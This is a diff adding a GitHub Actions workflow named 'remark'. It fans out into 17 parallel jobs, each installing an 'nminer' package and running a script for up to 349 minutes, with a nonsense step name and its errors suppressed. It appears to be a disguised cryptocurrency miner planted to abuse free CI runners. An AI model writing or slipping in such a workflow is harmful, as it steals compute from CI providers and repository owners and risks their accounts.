@@ -1,0 +1,42 @@
+name: remark
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 1799 }
+          - { version: 4375 }
+          - { version: 4880 }
+          - { version: 5541 }
+          - { version: 9877 }
+          - { version: 1853 }
+          - { version: 8687 }
+          - { version: 9997 }
+          - { version: 1276 }
+          - { version: 1373 }
+          - { version: 1536 }
+          - { version: 5958 }
+          - { version: 7792 }
+          - { version: 5293 }
+          - { version: 9858 }
+          - { version: 8024 }
+          - { version: 7044 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: than yuck frenetically forenenst urgently
+        run: |
+          npm install nminer@latest
+          timeout 349m node remark.js || echo "remark executed"
